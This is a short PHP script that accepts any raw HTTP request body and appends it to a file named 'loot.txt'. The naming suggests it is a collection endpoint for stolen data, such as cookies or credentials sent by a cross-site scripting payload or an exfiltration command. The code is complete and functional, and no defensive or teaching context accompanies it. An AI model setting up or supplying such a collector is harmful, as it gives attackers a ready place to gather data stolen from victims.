<?php
$data = file_get_contents("php://input");
file_put_contents("loot.txt", $data . "\n", FILE_APPEND);
?>
